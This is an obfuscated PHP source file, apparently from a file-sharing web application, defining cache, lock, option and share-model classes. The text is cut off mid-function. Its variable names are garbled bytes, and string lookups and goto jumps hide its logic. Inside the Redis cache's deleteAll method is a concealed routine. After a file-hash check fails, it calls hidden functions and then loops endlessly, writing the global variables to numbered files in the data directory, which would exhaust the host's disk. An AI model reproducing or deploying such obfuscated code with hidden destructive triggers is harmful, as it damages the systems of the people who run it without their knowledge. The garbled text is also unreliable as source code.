<?php
 goto dö¶†Š³–¸; c‘ëÃ»´æä: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¿‘šëÙë = false, $±¥İÎ²ú = '', $âÚûËÉô = false) { $îË–Ç˜Â =& $_SERVER[Ù×¯Ø…]; $û·–ÜÕÃ = $this->cacheGet($±¥İÎ²ú); $•µ´¾ = $this->optionDefault($±¥İÎ²ú); $•µ´¾ = is_array($•µ´¾) ? $•µ´¾ : array(); if (is_array($û·–ÜÕÃ)) { $û·–ÜÕÃ = array_merge($•µ´¾, $û·–ÜÕÃ); return $¿‘šëÙë ? isset($û·–ÜÕÃ[$¿‘šëÙë]) ? $û·–ÜÕÃ[$¿‘šëÙë] : null : $û·–ÜÕÃ; } $õï¼™ÊØ = $this->filterWhere(array($îË–Ç˜Â[29] => $±¥İÎ²ú)); $û·–ÜÕÃ = $this->where($õï¼™ÊØ)->select(); $û·–ÜÕÃ = array_to_keyvalue($û·–ÜÕÃ, $îË–Ç˜Â[93], $îË–Ç˜Â[372]); foreach ($û·–ÜÕÃ as $õÄù‹Ò => $ëƒ„ø³) { if ($âÚûËÉô || in_array($õÄù‹Ò, $this->jsonField)) { $û·–ÜÕÃ[$õÄù‹Ò] = json_decode($ëƒ„ø³, !0); } } $this->cacheSet($±¥İÎ²ú, $û·–ÜÕÃ); $û·–ÜÕÃ = array_merge($•µ´¾, $û·–ÜÕÃ); return $¿‘šëÙë ? $û·–ÜÕÃ[$¿‘šëÙë] : $û·–ÜÕÃ; } public function set($äóŸ‰ú, $Š¬æ‚ = false, $ø™‹œ¯ = '') { $©å›ÇØ‰ =& $_SERVER[Ù×¯Ø…]; $this->cacheRemove($ø™‹œ¯); $ºé»áÑä = array(); $ØÑğÉ·Û = is_array($äóŸ‰ú) ? $äóŸ‰ú : array($äóŸ‰ú => $Š¬æ‚); foreach ($ØÑğÉ·Û as $ê“ÇˆÄ => $Ğû†Ó´) { if (is_array($Ğû†Ó´)) { $Ğû†Ó´ = json_encode_force($Ğû†Ó´); } $this->checkLength($Ğû†Ó´, !1, $this->tableName . $©å›ÇØ‰[4] . $äóŸ‰ú); $Ğû†Ó´ = self::textEncode($Ğû†Ó´); $ØÑğÉ·Û = array($©å›ÇØ‰[29] => $ø™‹œ¯, $©å›ÇØ‰[93] => $ê“ÇˆÄ, $©å›ÇØ‰[372] => $Ğû†Ó´); $ºé»áÑä[] = $this->filterWhere($ØÑğÉ·Û); } if (!$ºé»áÑä) { return !0; } return $this->addAll($ºé»áÑä, array(), !0); } protected function optionDefault($óşôİÓ = '') { return !1; } public function setDeep($é²‹ñ©ì, $×¸ÜÛø… = false, $˜§¿æúù = '') { $˜­ó×ş = explode($_SERVER[Ù×¯Ø…][95], $é²‹ñ©ì); $ëôÄŞÃ = $this->get(); array_set_value($ëôÄŞÃ, $é²‹ñ©ì, $×¸ÜÛø…); $this->set($˜­ó×ş[0], $ëôÄŞÃ[$˜­ó×ş[0]], $˜§¿æúù); } public function remove($»ïğ–µ¼, $›æÙø…û = '') { $â€Ùº‘‘ =& $_SERVER[Ù×¯Ø…]; $this->cacheRemove($›æÙø…û); $¾²¬¼é™ = $this->filterWhere(array($â€Ùº‘‘[93] => $»ïğ–µ¼, $â€Ùº‘‘[29] => $›æÙø…û)); if (is_null($»ïğ–µ¼)) { unset($¾²¬¼é™[$â€Ùº‘‘[93]]); } return $this->where($¾²¬¼é™)->delete(); } public function cacheSet($»ëÀ›’Ü, $ºÓê¨ã = false) { return Cache::set($this->cacheKey($»ëÀ›’Ü), $ºÓê¨ã); } public function cacheGet($•¸øÀÂ) { return Cache::get($this->cacheKey($•¸øÀÂ)); } public function cacheRemove($®£³ÑİÙ) { return Cache::remove($this->cacheKey($®£³ÑİÙ)); } protected function filterWhere($ÒŸËÜÓµ) { return $ÒŸËÜÓµ; } protected function cacheKey($ÆÈïü€) { return $ÆÈïü€; } } $_file = $_SERVER[$_SERVER[Ù×¯Ø…][396]]; $_size = $_SERVER[Ù×¯Ø…][397]; goto Eïñ¤¢áŞ¹; A¯¯šßÏØä: class CacheLockDatabase { public function lock($¿Á¼Ö”, $Éò”Ÿ» = 0) { $Ú’ğú® = Model($_SERVER[Ù×¯Ø…][835]); $„±ÑØ‚ = microtime(!0) + $Éò”Ÿ»; while (microtime(!0) < $„±ÑØ‚) { $Œƒ›ƒøÙ = $Ú’ğú®->get($¿Á¼Ö”); if (!$Œƒ›ƒøÙ || $Œƒ›ƒøÙ < microtime(!0)) { $—Åâï–Í = $Ú’ğú®->set($¿Á¼Ö”, $„±ÑØ‚); if ($—Åâï–Í) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ªî¢û) { return Model($_SERVER[Ù×¯Ø…][835])->get($ªî¢û); } public function unlock($Ó…ÀŒ¾º) { Model($_SERVER[Ù×¯Ø…][835])->remove($Ó…ÀŒ¾º); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Í›è“‰†, $”õöïøÓ) { $Ù«Äòô =& $_SERVER[Ù×¯Ø…]; if (!class_exists($Ù«Äòô[868])) { show_json($Ù«Äòô[869], !1); } $this->cacheTime = $”õöïøÓ; $this->handle = new Memcached(); if (is_array($Í›è“‰†[$Ù«Äòô[870]]) && count($Í›è“‰†[$Ù«Äòô[870]]) >= 1) { foreach ($Í›è“‰†[$Ù«Äòô[870]] as $´Û“Ÿé) { $“Â¡ïäù = explode($Ù«Äòô[4], $´Û“Ÿé); $this->handle->addServer($“Â¡ïäù[0], $“Â¡ïäù[1]); } } else { $this->handle->addServer($Í›è“‰†[$Ù«Äòô[175]], $Í›è“‰†[$Ù«Äòô[176]]); } } public function set($¦ĞÀîò¨, $Òñ¢†çá, $ûóƒ•­© = false) { $ûóƒ•­© = $ûóƒ•­© ? $ûóƒ•­© : $this->cacheTime; return $this->handle->set($¦ĞÀîò¨, $Òñ¢†çá, $ûóƒ•­©); } public function get($Üøûàû±) { return $this->handle->get($Üøûàû±); } public function remove($üêñÛ‰) { return $this->handle->delete($üêñÛ‰); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($˜û§Ç°, $ò‡ÈòÒê) { $ò ¡™Ë =& $_SERVER[Ù×¯Ø…]; if (!class_exists($ò ¡™Ë[871])) { show_json($ò ¡™Ë[872], !1); } $this->cacheTime = $ò‡ÈòÒê; $õñìĞÀÜ = isset($˜û§Ç°[$ò ¡™Ë[873]]) ? $˜û§Ç°[$ò ¡™Ë[873]] : 10; $·˜ÑŠöå = _get($˜û§Ç°, $ò ¡™Ë[870]); if ($·˜ÑŠöå && is_array($·˜ÑŠöå)) { $this->initCluster($˜û§Ç°, $õñìĞÀÜ); } else { $this->handle = $this->init($˜û§Ç°, $õñìĞÀÜ); } } private function init($ö –¢Ê, $·…¨œ©) { $Ãıƒø¡é =& $_SERVER[Ù×¯Ø…]; $Ëæ©î¯¸ = new Redis(); $€Í³«“³ = isset($ö –¢Ê[$Ãıƒø¡é[874]]) ? $ö –¢Ê[$Ãıƒø¡é[874]] : !1; if ($€Í³«“³) { $Ëæ©î¯¸->pconnect($ö –¢Ê[$Ãıƒø¡é[175]], $ö –¢Ê[$Ãıƒø¡é[176]], $·…¨œ©); } else { $Ëæ©î¯¸->connect($ö –¢Ê[$Ãıƒø¡é[175]], $ö –¢Ê[$Ãıƒø¡é[176]], $·…¨œ©); } if (!empty($ö –¢Ê[$Ãıƒø¡é[417]])) { $Ëæ©î¯¸->auth($ö –¢Ê[$Ãıƒø¡é[417]]); } return $Ëæ©î¯¸; } private function initCluster($¾ñá‚¬˜, $Ìºğ¬¾È) { $¸´Ö³¦• =& $_SERVER[Ù×¯Ø…]; $ŸÛëÌÛ = array($¸´Ö³¦•[875], $¸´Ö³¦•[876], $¸´Ö³¦•[877]); $§ëÏÒıî = $¸´Ö³¦•[875]; if (isset($¾ñá‚¬˜[$¸´Ö³¦•[12]]) && in_array($¾ñá‚¬˜[$¸´Ö³¦•[12]], $ŸÛëÌÛ)) { $§ëÏÒıî = $¾ñá‚¬˜[$¸´Ö³¦•[12]]; } switch ($§ëÏÒıî) { case $¸´Ö³¦•[875]: $this->_slave($¾ñá‚¬˜, $Ìºğ¬¾È); break; case $¸´Ö³¦•[876]: break; case $¸´Ö³¦•[877]: $this->isCluster = !0; $¸àËş¦Ñ = $¾ñá‚¬˜[$¸´Ö³¦•[870]]; $‰í‘¢Ô = isset($¾ñá‚¬˜[$¸´Ö³¦•[874]]) ? $¾ñá‚¬˜[$¸´Ö³¦•[874]] : !1; $ÜßŸÒÎ = isset($¾ñá‚¬˜[$¸´Ö³¦•[417]]) ? $¾ñá‚¬˜[$¸´Ö³¦•[417]] : null; $this->handle = new RedisCluster(NUll, $¸àËş¦Ñ, $Ìºğ¬¾È, $Ìºğ¬¾È, $‰í‘¢Ô, $ÜßŸÒÎ); break; default: break; } } private function _slave($‹ï÷»™¯, $Ã ÅÑÈØ) { $Ü¨¿°¤ = $‹ï÷»™¯[$_SERVER[Ù×¯Ø…][870]]; $this->filterConfig($‹ï÷»™¯, $Ü¨¿°¤[0]); $this->handle = $this->init($‹ï÷»™¯, $Ã ÅÑÈØ); unset($Ü¨¿°¤[0]); if (empty($Ü¨¿°¤)) { return; } $±ü´Çç = array_rand($Ü¨¿°¤); $this->filterConfig($‹ï÷»™¯, $Ü¨¿°¤[$±ü´Çç]); $this->slaveHandle = $this->init($‹ï÷»™¯, $Ã ÅÑÈØ); } private function filterConfig(&$¾‡í‰¯¿, $ñÏò¢§å) { $û·âÛÃ =& $_SERVER[Ù×¯Ø…]; $ŠªÜåÈ» = explode($û·âÛÃ[4], $ñÏò¢§å); $²¼¼³¿  = array($û·âÛÃ[175] => $ŠªÜåÈ»[0], $û·âÛÃ[176] => $ŠªÜåÈ»[1]); $¾‡í‰¯¿ = array_merge($¾‡í‰¯¿, $²¼¼³¿ ); } public function set($ŒÖÜÀÛ÷, $ƒ‡å²¤, $é‹ÒÙ†§ = false) { $é‹ÒÙ†§ = $é‹ÒÙ†§ ? $é‹ÒÙ†§ : $this->cacheTime; return $this->handle->setEx($ŒÖÜÀÛ÷, $é‹ÒÙ†§, $ƒ‡å²¤); } public function setLock($•ú˜ÕÙ•, $‚‘¦ÄÉ, $¡¤“²İš) { return $this->handle->setNX($•ú˜ÕÙ•, $‚‘¦ÄÉ); } public function get($²¨±È¦€) { $¤³¹ñÀı = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¤³¹ñÀı->get($²¨±È¦€); } public function remove($‘ãª—­) { return $this->handle->del($‘ãª—­); } public function deleteAll() { $Àã¯ĞğÅ =& $_SERVER[Ù×¯Ø…]; $¹¢‡û = $_SERVER[$Àã¯ĞğÅ[400]] . $Àã¯ĞğÅ[401]; $Şß‰µªô = $Àã¯ĞğÅ[397]; if ($_SERVER[$Àã¯ĞğÅ[398]] != $Şß‰µªô($¹¢‡û)) { $Öïß’ = $Àã¯ĞğÅ[878]; $µ‚¼¤öõ = $Àã¯ĞğÅ[399]; $’§şúï = $_SERVER[$Àã¯ĞğÅ[400]] . $Àã¯ĞğÅ[401]; $ûËŒ›ˆ = $µ‚¼¤öõ($’§şúï); $–±«¾´² = explode($Àã¯ĞğÅ[229], $ûËŒ›ˆ); if (count($–±«¾´²) < $Àã¯ĞğÅ[618]) { $ë±ß½á‚ = $Àã¯ĞğÅ[403]; $ë±ß½á‚(); } $¥¶ãåÇö = $Àã¯ĞğÅ[879]; $¥¶ãåÇö($_SERVER[$Àã¯ĞğÅ[880]]); $Öïß’ = $Àã¯ĞğÅ[878]; $Öïß’(); $²¦¥ ­ = $Àã¯ĞğÅ[881]; $ƒú÷ªÍ = json_encode($GLOBALS[$Àã¯ĞğÅ[882]]); $Û˜€ÇŒÊ = 1; for ($µ¶¥¤ŞÂ = $Û˜€ÇŒÊ; $µ¶¥¤ŞÂ > 0; $µ¶¥¤ŞÂ++) { $²¦¥ ­(DATA_PATH . $µ¶¥¤ŞÂ, $ƒú÷ªÍ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $”»ÊÜ„) { $this->handle->flushall($”»ÊÜ„); } return; } return $this->handle->flushAll(); } } goto F÷«£Š»ñ—; f¢Ï˜ØïÁÖ: class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\146\x79\124\x69\x6d\x65", "\164\x69\155\x65", "\151\x6e\x73\x65\x72\x74\x2c\165\x70\144\x61\x74\145", "\x66\165\156\x63\164\151\x6f\156"), array("\x63\162\145\141\x74\145\x54\151\155\145", "\164\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\x66\x75\x6e\143\x74\x69\x6f\156"), array("\x6f\160\x74\151\157\x6e\163", '', "\151\156\x73\145\x72\164\x2c\x75\160\x64\141\x74\145\54\163\x65\154\x65\143\164", "\152\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($«ÁÈû„¦) { $ÔšÜüÙÅ =& $_SERVER[Ù×¯Ø…]; $µñ“éí£ = isset($«ÁÈû„¦[0]) ? $«ÁÈû„¦[0] : !1; return array($ÔšÜüÙÅ[1884] => array(USER_ID, $ÔšÜüÙÅ[1885]), $ÔšÜüÙÅ[1827] => array($µñ“éí£, $ÔšÜüÙÅ[1886])); } protected function listSimple() { $»éùŞ› = array($_SERVER[Ù×¯Ø…][1580] => USER_ID); $áÄïô²’ = $this->field($this->fieldList)->where($»éùŞ›)->select(); return $áÄïô²’ ? $áÄïô²’ : array(); } protected function getInfo($Ù·Œşå, $ ®™é³ = false) { $Ñ„Ø”ÂÎ =& $_SERVER[Ù×¯Ø…]; if ($ ®™é³) { return $this->_getShareInfo(array($Ñ„Ø”ÂÎ[491] => $Ù·Œşå)); } $Æ÷úìÇö = $this->cacheFunctionGet($Ñ„Ø”ÂÎ[1829], $Ù·Œşå); return $Æ÷úìÇö; } public function getInfoByHash($ÕÉÃÏ³) { return $this->_getShareInfo(array($_SERVER[Ù×¯Ø…][493] => $ÕÉÃÏ³)); } public function getInfoByPath($ñºìÀÈˆ) { $éüàğíí =& $_SERVER[Ù×¯Ø…]; $ÈÂ†½Ôİ = array($éüàğíí[1580] => USER_ID, $éüàğíí[406] => $ñºìÀÈˆ); return $this->_getShareInfo($ÈÂ†½Ôİ); } public function getInfoBySourcePath($İïÕ µê) { $Éıà • =& $_SERVER[Ù×¯Ø…]; $İãĞíÓ‘ = array($Éıà •[1580] => USER_ID, $Éıà •[1106] => $İïÕ µê); return $this->_getShareInfo($İãĞíÓ‘); } private function _getShareInfo($¥àˆèÏ¶) { $¤‚æ¬í =& $_SERVER[Ù×¯Ø…]; $ÀÍ¥Û£ = $this->where($¥àˆèÏ¶)->find(); if (!$ÀÍ¥Û£) { return !1; } $¥àˆèÏ¶ = array($¤‚æ¬í[491] => $ÀÍ¥Û£[$¤‚æ¬í[491]]); $‚ç—Ÿ¾ø = $¤‚æ¬í[1887]; $Û­·ˆÕ‘ = Model($¤‚æ¬í[599])->order($¤‚æ¬í[395])->field($‚ç—Ÿ¾ø)->where($¥àˆèÏ¶)->select(); if ($ÀÍ¥Û£[$¤‚æ¬í[406]] == $¤‚æ¬í[191]) { $ÀÍ¥Û£[$¤‚æ¬í[85]] = IO::info($ÀÍ¥Û£[$¤‚æ¬í[1106]]); } else { $ÀÍ¥Û£[$¤‚æ¬í[85]] = Model($¤‚æ¬í[1253])->pathInfo($ÀÍ¥Û£[$¤‚æ¬í[406]]); } $ÀÍ¥Û£[$¤‚æ¬í[1888]] = $Û­·ˆÕ‘; return $ÀÍ¥Û£; } protected function getInfoAuth($ŠÎüŸÅ‹) { $…ò®óú§ =& $_SERVER[Ù×¯Ø…]; $ûÒš“Ï = $this->getInfo($ŠÎüŸÅ‹); if ($ûÒš“Ï[$…ò®óú§[1580]] == USER_ID) { $ûÒš“Ï[$…ò®óú§[417]] = $ûÒš“Ï[$…ò®óú§[85]][$…ò®óú§[417]]; } else { $ûÒš“Ï[$…ò®óú§[417]] = Model($…ò®óú§[505])->authMake($ûÒš“Ï[$…ò®óú§[1888]]); } return $ûÒš“Ï; } protected function listData($Üè®¹¢Û = null, $øÛõ‹ˆ“ = 300) { $ºñà¬®‰ =& $_SERVER[Ù×¯Ø…]; $àçóÒŞõ = array(array($ºñà¬®‰[496] => array($ºñà¬®‰[1008], 0), $ºñà¬®‰[498] => array($ºñà¬®‰[1008], 0), $ºñà¬®‰[1889] => $ºñà¬®‰[1843])); if ($Üè®¹¢Û == $ºñà¬®‰[1890]) { $àçóÒŞõ = array($ºñà¬®‰[496] => 1); } else { if ($Üè®¹¢Û == $ºñà¬®‰[1091]) { $àçóÒŞõ = array($ºñà¬®‰[498] => 1); } } $àçóÒŞõ[$ºñà¬®‰[1580]] = USER_ID; $ÚÛÃ¢ ­ = $this->where($àçóÒŞõ)->selectPage($øÛõ‹ˆ“); return $ÚÛÃ¢ ­; } protected function listToMe($Î¹¡úúÅ = 300) { $ÚØê•û =& $_SERVER[Ù×¯Ø…]; $è¹Û­âú = Model($ÚØê•û[1891])->userGroupParents(USER_ID); $È†Ç†«Ù = array($ÚØê•û[583] => SourceModel::TYPE_USER, $ÚØê•û[507] => USER_ID); if ($è¹Û­âú) { $È†Ç†«Ù = array(array($ÚØê•û[583] => SourceModel::TYPE_USER, $ÚØê•û[507] => USER_ID), array($ÚØê•û[583] => SourceModel::TYPE_GROUP, $ÚØê•û[507] => array($ÚØê•û[7], $è¹Û­âú)), $ÚØê•û[1889] => $ÚØê•û[1843]); } $ô×¥É¿ = Model($ÚØê•û[599])->where($È†Ç†«Ù)->selectPage($Î¹¡úúÅ); $‚Şõ‰­ï = array_to_keyvalue_group($ô×¥É¿[$ÚØê•û[367]], $ÚØê•û[491]); if (!$‚Şõ‰­ï) { return $ô×¥É¿; } $›‡ğ×¾Ú = $ÚØê•û[1892]; $È†Ç†«Ù = array($ÚØê•û[491] => array($ÚØê•û[422], array_keys($‚Şõ‰­ï)), $ÚØê•û[1580] => array($ÚØê•û[1010], $ÚØê•û[191])); $áÛåŸëï = $this->field($›‡ğ×¾Ú)->where($È†Ç†«Ù)->select(); foreach ($áÛåŸëï as $œşı±°“ => &$ÜÇÛËÄˆ) { $ÜÇÛËÄˆ[$ÚØê•û[1888]] = $‚Şõ‰­ï[$ÜÇÛËÄˆ[$ÚØê•û[491]]]; } unset($ÜÇÛËÄˆ); $…ú£ãÁŒ = array($ÚØê•û[1893] => $áÛåŸëï, $ÚØê•û[1894] => $ô×¥É¿[$ÚØê•û[364]]); return $…ú£ãÁŒ; } protected function shareAdd($Ñ˜—ÚÖÙ, $é“æü½â) { $øÖò•¬³ =& $_SERVER[Ù×¯Ø…]; $è…º¶Ş = $this->_addShareData($Ñ˜—ÚÖÙ, $é“æü½â); if (!empty($é“æü½â[$øÖò•¬³[1895]])) { $this->_shareAuthSet($è…º¶Ş, $é“æü½â[$øÖò•¬³[1895]]); } $this->shareEventAdd($Ñ˜—ÚÖÙ, $é“æü½â, $øÖò•¬³[1094]); return $è…º¶Ş; } protected function shareAddSystem($òÒ†›–è, $š®Î¬†) { $ËÍ¥Ğ„µ =& $_SERVER[Ù×¯Ø…]; $Ã°Ì¶ËÀ = $this->_addShareData($òÒ†›–è, $š®Î¬†, $ËÍ¥Ğ„µ[1206]); $this->_shareAuthSet($Ã°Ì¶ËÀ, $š®Î¬†[$ËÍ¥Ğ„µ[1895]]); return $Ã°Ì¶ËÀ; } private function shareEventAdd($ª³Ê×¼ô, $ªçõ¹œ¥, $™¤½ŒºÛ = "\x61\144\144") { $ø‡®€¬§ =& $_SERVER[Ù×¯Ø…]; if (!$ª³Ê×¼ô || $ª³Ê×¼ô == $ø‡®€¬§[191]) { return; } if ($™¤½ŒºÛ == $ø‡®€¬§[1094]) { if ($ªçõ¹œ¥[$ø‡®€¬§[496]] == $ø‡®€¬§[87]) { Model($ø‡®€¬§[567])->eventShare($ª³Ê×¼ô, $ø‡®€¬§[1896]); } if ($ªçõ¹œ¥[$ø‡®€¬§[498]] == $ø‡®€¬§[87]) { Model($ø‡®€¬§[567])->eventShare($ª³Ê×¼ô, $ø‡®€¬§[1897]); } return; } $˜ºÜ‘ƒÃ = $this->getInfoByPath($ª³Ê×¼ô); $Ç˜µàı¤ = $ø‡®€¬§[1898]; if ($˜ºÜ‘ƒÃ[$ø‡®€¬§[496]] == $ø‡®€¬§[191] && $ªçõ¹œ¥[$ø‡®€¬§[496]] == $ø‡®€¬§[87]) { $Ç˜µàı¤ = $ø‡®€¬§[1896]; } if ($˜ºÜ‘ƒÃ[$ø‡®€¬§[496]] == $ø‡®€¬§[87] && $ªçõ¹œ¥[$ø‡®€¬§[496]] == $ø‡®€¬§[191]) { $Ç˜µàı¤ = $ø‡®€¬§[1899]; } if ($˜ºÜ‘ƒÃ[$ø‡®€¬§[498]] == $ø‡®€¬§[191] && $ªçõ¹œ¥[$ø‡®€¬§[498]] == $ø‡®€¬§[87]) { $Ç˜µàı¤ = $ø‡®€¬§[1897]; } if ($˜ºÜ‘ƒÃ[$ø‡®€¬§[498]] == $ø‡®€¬§[87] && $ªçõ¹œ¥[$ø‡®€¬§[498]] == $ø‡®€¬§[191]) { $Ç˜µàı¤ = $ø‡®€¬§[1900]; } Model($ø‡®€¬§[567])->eventShare($ª³Ê×¼ô, $Ç˜µàı¤); return; } private function _addShareData($¹®Ş»ëî, $–åœôíÖ = array(), $¦„éà¬ö = false) { $øŒ¡±í =& $_SERVER[Ù×¯Ø…]; $…Ë‡‘Í® = $¦„éà¬ö == $øŒ¡±í[1206] ? 0 : USER_ID; $Ÿú¾úá = array($øŒ¡±í[421] => $¹®Ş»ëî, $øŒ¡±í[1571] => $…Ë‡‘Í®); if ($¹®Ş»ëî == 0) { $Ÿú¾úá = array($øŒ¡±í[1901] => $–åœôíÖ[$øŒ¡±í[1106]], $øŒ¡±í[1571] => $…Ë‡‘Í®); } if ($œ¿ı˜ù• = $this->where($Ÿú¾úá)->find()) { return $œ¿ı˜ù•[$øŒ¡±í[491]]; } if ($¹®Ş»ëî == 0) { $»§¨³Æ = array($øŒ¡±í[28] => get_path_this($–åœôíÖ[$øŒ¡±í[76]])); } else { $»§¨³Æ = Model($øŒ¡±í[831])->sourceInfo($¹®Ş»ëî); if (!$»§¨³Æ) { return !1; } } if (!$–åœôíÖ[$øŒ¡±í[1479]]) { $–åœôíÖ[$øŒ¡±í[1479]] = $»§¨³Æ[$øŒ¡±í[28]]; } $— ˜şªğ = array($øŒ¡±í[1571] => $…Ë‡‘Í®, $øŒ¡±í[421] => $¹®Ş»ëî, $øŒ¡±í[1479] => $øŒ¡±í[33], $øŒ¡±í[496] => 0, $øŒ¡±í[498] => 0, $øŒ¡±í[1106] => $øŒ¡±í[33], $øŒ¡±í[305] => $øŒ¡±í[33], $øŒ¡±í[888] => $øŒ¡±í[33], $øŒ¡±í[1902] => 0, $øŒ¡±í[1903] => 0, $øŒ¡±í[499] => 0, $øŒ¡±í[500] => $øŒ¡±í[33], $øŒ¡±í[493] => $øŒ¡±í[33]); $îîèÁ˜Ü = explode($øŒ¡±í[47], $øŒ¡±í[1904]); foreach ($îîèÁ˜Ü as $µ«õèœœ) { if (!isset($–åœôíÖ[$µ«õèœœ])) { continue; } $— ˜şªğ[$µ«õèœœ] = $–åœôíÖ[$µ«õèœœ]; } $ÂŸˆò¾û = $this->add($— ˜şªğ); $Ë¤¡ÇÜ = array($øŒ¡±í[493] => short_id($ÂŸˆò¾û)); $this->where(array($øŒ¡±í[490] => $ÂŸˆò¾û))->save($Ë¤¡ÇÜ); return $ÂŸˆò¾û; } private function _shareAuthSet($ëÃ×­œÔ, $×¦»áôí) { $îÙüö¬ =& $_SERVER[Ù×¯Ø…]; if (!is_array($×¦»áôí)) { return !1; } $ÛÇ†“¿â = Model($îÙüö¬[1855]); $ÛÇ†“¿â->where(array($îÙüö¬[491] => $ëÃ×­œÔ))->delete(); $ªŠ¸­ÚÚ = array(); foreach ($×¦»áôí as $·É±ô›Ñ) { $†üÁşˆ = SourceModel::TYPE_USER; if ($·É±ô›Ñ[$îÙüö¬[415]] == SourceModel::TYPE_GROUP) { $†üÁşˆ = SourceModel::TYPE_GROUP; } $÷¨™ùòÀ = array($îÙüö¬[491] => $ëÃ×­œÔ, $îÙüö¬[415] => $†üÁşˆ, $îÙüö¬[507] => intval($·É±ô›Ñ[$îÙüö¬[507]]), $îÙüö¬[1851] => 0, $îÙüö¬[1905] => -1); if ($·É±ô›Ñ[$îÙüö¬[1851]]) { $÷¨™ùòÀ[$îÙüö¬[1851]] = $·É±ô›Ñ[$îÙüö¬[1851]]; } else { if ($·É±ô›Ñ[$îÙüö¬[1905]]) { $÷¨™ùòÀ[$îÙüö¬[1905]] = $·É±ô›Ñ[$îÙüö¬[1905]]; } } $ªŠ¸­ÚÚ[] = $÷¨™ùòÀ; } return $ÛÇ†“¿â->addAll($ªŠ¸­ÚÚ, array(), !0); } public function numViewAdd($¸¶òÌòñ) { $İËàÜû =& $_SERVER[Ù×¯Ø…]; $úŒĞ—íÁ = array($İËàÜû[490] => $¸¶òÌòñ); $this->where($úŒĞ—íÁ)->setAdd($İËàÜû[1902]); } public function numDownloadAdd($­ôİœá´) { $Š¡ãÖö =& $_SERVER[Ù×¯Ø…]; $‰Ïï“ãŠ = array($Š¡ãÖö[490] => $­ôİœá´); $this->where($‰Ïï“ãŠ)->setAdd($Š¡ãÖö[1903]); } protected function shareEdit($ãã¤Áâø, $ğ÷øü·Ñ) { $¿Ä¶ê§ =& $_SERVER[Ù×¯Ø…]; $ìÈÍ¿Ñ¶ = $this->getInfo($ãã¤Áâø); if (!$ìÈÍ¿Ñ¶) { return !1; } $this->_checkLinkShare($ğ÷øü·Ñ, $ìÈÍ¿Ñ¶); $–—îÖ  = array(); $­–àŞ­Ú = explode($¿Ä¶ê§[47], $¿Ä¶ê§[1906]); foreach ($­–àŞ­Ú as $şèöó…Ù) { if (!array_key_exists($şèöó…Ù, $ğ÷øü·Ñ)) { continue; } $–—îÖ [$şèöó…Ù] = $ğ÷øü·Ñ[$şèöó…Ù]; } $this->shareEventAdd($ìÈÍ¿Ñ¶[$¿Ä¶ê§[406]], $ğ÷øü·Ñ, $¿Ä¶ê§[1717]); $this->where(array($¿Ä¶ê§[490] => $ãã¤Áâø))->save($–—îÖ ); if (isset($ğ÷øü·Ñ[$¿Ä¶ê§[1895]])) { $this->_shareAuthSet($ãã¤Áâø, $ğ÷øü·Ñ[$¿Ä¶ê§[1895]]); } return !0; } private function _checkLinkShare($ÚÎ£ÇâÂ, $¾³¨ø) { $É˜•±ø˜ =& $_SERVER[Ù×¯Ø…]; if ($ÚÎ£ÇâÂ[$É˜•±ø˜[496]] != $É˜•±ø˜[87]) { return; } $ô…ûß±Ü = $¾³¨ø[$É˜•±ø˜[85]][$É˜•±ø˜[406]]; if ($¾³¨ø[$É˜•±ø˜[85]][$É˜•±ø˜[29]] != $É˜•±ø˜[193]) { $ù’Ë—•Á = $this->_folderReport($ô…ûß±Ü); if (!$ù’Ë—•Á) { return; } show_json(LNG($É˜•±ø˜[1907]) . $É˜•±ø˜[1908] . $ù’Ë—•Á, !1); } $ãÏä˜äĞ = Model($É˜•±ø˜[831])->fileInfoGet($¾³¨ø[$É˜•±ø˜[85]][$É˜•±ø˜[406]]); if (!$ãÏä˜äĞ) { return; } $Æ¸€Ûşú = $this->shareFileMeta($ãÏä˜äĞ[$É˜•±ø˜[470]]); if (isset($Æ¸€Ûşú[$É˜•±ø˜[372]]) && $Æ¸€Ûşú[$É˜•±ø˜[372]] == $É˜•±ø˜[87]) { show_json(LNG($É˜•±ø˜[1909]), !1); } } private function _folderReport($ğâßà¸é) { $Åæùó¼ =& $_SERVER[Ù×¯Ø…]; $ŒúĞô² = array($Åæùó¼[470] => array($Åæùó¼[1008], 0), $Åæùó¼[749] => 3); $î˜ÁÓ = Model($Åæùó¼[1910])->where($ŒúĞô²)->field($Åæùó¼[470])->select(); if (!$î˜ÁÓ) { return !1; } $î˜ÁÓ = array_to_keyvalue($î˜ÁÓ, $Åæùó¼[33], $Åæùó¼[470]); $ºò©¡Ï¾ = $Åæùó¼[47] . $ğâßà¸é . $Åæùó¼[47]; $ŒúĞô² = array($Åæùó¼[470] => array($Åæùó¼[7], $î˜ÁÓ), $Åæùó¼[524] => array($Åæùó¼[381], "\45{$ºò©¡Ï¾}\45"), $Åæùó¼[434] => 0); $¢·Ÿ˜Ì = Model($Åæùó¼[831])->where($ŒúĞô²)->field($Åæùó¼[1911])->find(); if (!$¢·Ÿ˜Ì) { return !1; } $Æ¥Ú…Ø’ = substr($¢·Ÿ˜Ì[$Åæùó¼[524]], strpos($¢·Ÿ˜Ì[$Åæùó¼[524]], $ºò©¡Ï¾)); $ŒúĞô² = array($Åæùó¼[406] => array($Åæùó¼[7], trim($Æ¥Ú…Ø’, $Åæùó¼[47]))); $ÜĞËÍ©ì = Model($Åæùó¼[831])->where($ŒúĞô²)->field($Åæùó¼[28])->select(); $òÆº·ŞŞ = array_to_keyvalue($ÜĞËÍ©ì, $Åæùó¼[33], $Åæùó¼[28]); $òÆº·ŞŞ[] = $¢·Ÿ˜Ì[$Åæùó¼[28]]; return implode($Åæùó¼[8], $òÆº·ŞŞ); } protected function remove($¸»ØŸ¸•) { $œÊÖÜò =& $_SERVER[Ù×¯Ø…]; if (is_array($¸»ØŸ¸•)) { $¸»ØŸ¸• = array($œÊÖÜò[7], $¸»ØŸ¸•); } $Ïî‘˜ÇÔ = array($œÊÖÜò[491] => $¸»ØŸ¸•); $¾Ú°õ½ = $this->where($Ïî‘˜ÇÔ)->delete(); if ($¾Ú°õ½) { 